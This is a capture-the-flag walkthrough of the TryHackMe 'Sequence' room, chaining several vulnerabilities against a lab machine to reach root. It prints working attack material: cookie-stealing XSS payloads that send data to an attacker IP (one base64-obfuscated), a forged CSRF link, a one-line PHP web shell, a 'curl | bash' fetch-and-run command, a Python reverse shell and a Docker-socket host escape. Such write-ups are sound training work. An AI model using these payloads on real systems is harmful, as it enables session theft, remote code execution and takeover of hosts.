![Congrats](assets/screenshots/sequence/congrats.png)

# TryHackMe – Sequence: Complete Walkthrough

**Room:** Sequence  
**Platform:** TryHackMe  
**Difficulty:** Medium  
**Objective:** Chain multiple vulnerabilities to gain full control of the system.

## Tools Used
- **Nmap** – port scanning
- **FFUF** – directory fuzzing
- **Python HTTP server** – hosting payloads and exfiltrating data
- **Netcat** – reverse shell listener
- **Curl** – sending crafted HTTP requests
- **Browser DevTools** – cookie manipulation, source inspection, and request editing

---

## Step 1: Reconnaissance
We added the target domain to our `/etc/hosts` file:

```bash
echo "10.48.166.194 review.thm" >> /etc/hosts
```

### Nmap Scan
```bash
nmap -p- -sV -sC -Pn review.thm
```
- **Port 22 (SSH)** – OpenSSH 8.2p1
- **Port 80 (HTTP)** – Apache 2.4.41 with PHP

Critical finding: The `PHPSESSID` cookie had no HttpOnly flag – meaning JavaScript could access it, making XSS attacks very dangerous.

### Directory Fuzzing
```bash
ffuf -u http://review.thm/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -e php,txt
```
We found `/mail/` with directory listing enabled. Inside, `dump.txt` contained:

```text
From: software@review.thm
...
The Finance panel (`/finance.php`) is hosted on the internal 192.x network.
Access is protected with password: S60u}f5j
```

This leak gave us:
1. A password for internal panels
2. Two hidden endpoints: `/finance.php` and `/lottery.php`

---

## Step 2: Stored XSS – Getting the Mod Flag
The contact form allowed arbitrary HTML/JavaScript injection. We used a self‑contained payload that didn't require hosting a separate `.js` file.

We started a Python HTTP server to capture the exfiltrated cookie:

```bash
python3 -m http.server 80
```

**Payload #1 (plain):**
```html
<img src=x onerror="fetch('http://10.48.80.90/?c='+document.cookie)">
```
This triggers the `onerror` event when the image fails to load, sending the cookie to our server.

**Payload #2 (base64‑encoded, filter bypass):**
```html
<svg onload="eval(atob('ZmV0Y2goJ2h0dHA6Ly8xMC40OC44MC45MC8/Yz0nICsgZG9jdW1lbnQuY29va2llKQ=='))">
```
The base64 decodes to `fetch('http://10.48.80.90/?c='+document.cookie)`, which may bypass client‑side filters.

We submitted one of these payloads in the contact form’s message field. The moderator bot visited our submission, and we received a request containing the session cookie:

```text
GET /?c=PHPSESSID=vcprv32n1q36jctbla8gtclk41
```

We replaced our own `PHPSESSID` cookie with this value (using Firefox DevTools → Storage → Cookies) and refreshed the page. Viewing the page source (Ctrl+U) revealed the mod flag in the navigation bar:

![Mod Flag](assets/screenshots/sequence/flag1.png)

```text
THM{M0dH@ck3dPawned007}
```

---

## Step 3: CSRF – Privilege Escalation to Admin
As mod, we had access to a Chat feature. The admin account automatically opened any link we sent in the chat.

In the Settings page, we found a Promote Co‑Admin feature. It required a CSRF token, but we noticed that the token never changed and was simply the MD5 hash of the username.
We cracked the token `ad148a3ca8bd0ef3b48c52454c493ec5` → `mod` (using online tools or hashcat).

We then generated the token for admin:
```bash
echo -n "admin" | md5sum
# 21232f297a57a5a743894a0e4a801fc3
```

We sent this link via chat:
```text
http://review.thm/promote_coadmin.php?username=mod&csrf_token_promote=21232f297a57a5a743894a0e4a801fc3
```
The admin visited it, and our `mod` account was promoted to admin.
We logged out and back in. Now the admin dashboard was visible, and the admin flag appeared in the page source:

![Admin Flag](assets/screenshots/sequence/flag2.png)

```text
THM{Adm1NPawned007}
```

---

## Step 4: Accessing the Internal Finance Panel
The admin dashboard had a Lottery Feature, but we knew about the `/finance.php` endpoint from the leak.
We used Firefox DevTools (Network tab) to intercept the POST request when selecting "Lottery Feature".
We edited the request and changed the `feature` parameter from `lottery.php` to `finance.php`, then resent it.

The page displayed a password prompt. We entered `S60u}f5j` – the password from the earlier leak.
A file upload form appeared.

---

## Step 5: Remote Code Execution (RCE)
We uploaded a simple PHP shell that reads commands from a cookie (to avoid parameter issues).
File `shell_cookie.php`:

```php
<?php system($_COOKIE["x"]); ?>
```

After uploading, we triggered it using curl with the `x` cookie set to our reverse shell command:
```bash
curl -b "PHPSESSID=...; x=curl 10.48.80.90 | bash" -X POST -d "feature=uploads/shell_cookie.php" http://review.thm/dashboard.php
```

We had already set up a Python HTTP server serving a reverse shell payload:
```bash
echo 'python3 -c "import socket,subprocess,os;s=socket.socket(...);s.connect((\"10.48.80.90\",443));os.dup2(...);import pty;pty.spawn(\"sh\")"' > index.html
python3 -m http.server 80
```
And a Netcat listener:
```bash
nc -lvnp 443
```
The request executed the reverse shell, and we received a root shell inside a Docker container.

---

## Step 6: Docker Escape – Reading the Root Flag
Inside the container, we checked for the Docker socket:

```bash
ls -la /var/run/docker.sock
```
It was mounted – meaning we could interact with the host’s Docker daemon.

We listed available images:
```bash
docker image ls
```
We saw `phpvulnerable:latest`.

We ran a new container that mounted the host’s entire filesystem at `/mnt`:
```bash
docker run -v /:/mnt --rm -it phpvulnerable:latest bash
```

Inside this new container, we navigated to `/mnt/root/` and read the final flag:
```bash
cat /mnt/root/flag.txt
```

![Root Flag](assets/screenshots/sequence/flag3.png)

```text
THM{rootAccessD0n3}
```

---

## Summary of Flags

| Role | Flag |
| :--- | :--- |
| **Mod** | `THM{M0dH@ck3dPawned007}` |
| **Admin** | `THM{Adm1NPawned007}` |
| **Root** | `THM{rootAccessD0n3}` |

---

## Key Takeaways
- Leaked files can contain sensitive data (`dump.txt`).
- XSS with missing `HttpOnly` is a serious risk.
- Predictable CSRF tokens (MD5 of username) are trivial to bypass.
- Parameter tampering can expose hidden internal endpoints.
- Unrestricted file upload leads to remote code execution.
- Mounting Docker socket inside containers enables easy escape to the host.

_Room completed – June 2026_
